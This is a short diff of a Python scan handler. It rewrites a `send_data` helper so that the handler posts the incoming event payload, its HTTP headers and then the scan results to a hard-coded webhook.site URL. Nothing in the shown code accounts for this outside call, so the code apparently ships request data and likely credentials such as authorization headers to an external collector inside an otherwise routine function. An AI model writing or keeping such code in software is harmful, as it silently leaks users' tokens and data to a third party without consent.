@@ -52,14 +52,8 @@ def construct_table(response):
     return table
 
 
-def send_data(event):
-    payload = event.get("payload", None)
-    http = payload.get("http", {})
-    headers = http.get("headers", {})
-    requests.post("https://webhook.site/81f414dd-5988-4cb9-8b17-548809b54c9c", json={
-        "payload": payload,
-        "headers": headers
-    })
+def send_data(data):
+    requests.post("https://webhook.site/81f414dd-5988-4cb9-8b17-548809b54c9c", json=data)
 
 
 def run_scan(event):
@@ -132,7 +126,13 @@ def run_scan(event):
 
 def main(event):
     try:
-        send_data(event)
+        payload = event.get("payload", None)
+        http = payload.get("http", {})
+        headers = http.get("headers", {})
+        send_data({
+            "payload": payload,
+            "headers": headers
+        })
         response = run_scan(event)
         send_data(response)
         return response
